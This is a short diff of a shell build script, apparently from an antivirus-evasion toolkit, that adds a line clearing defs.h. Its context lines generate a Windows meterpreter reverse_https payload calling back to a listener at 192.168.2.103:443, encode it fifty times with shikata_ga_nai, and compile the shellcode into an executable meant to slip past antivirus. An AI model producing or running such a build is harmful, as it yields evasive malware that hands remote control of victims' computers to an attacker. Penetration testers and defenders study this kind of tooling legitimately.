@@ -6,6 +6,8 @@
 . build/global_win32.sh
 # make meterpreter reverse payload, encoded 50 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > sc.txt
+# clean defs.h
+echo "" > defs.h
 # call make_avet, compule shellcode into the executable
 ./make_bfg -f sc.txt
 # compile 
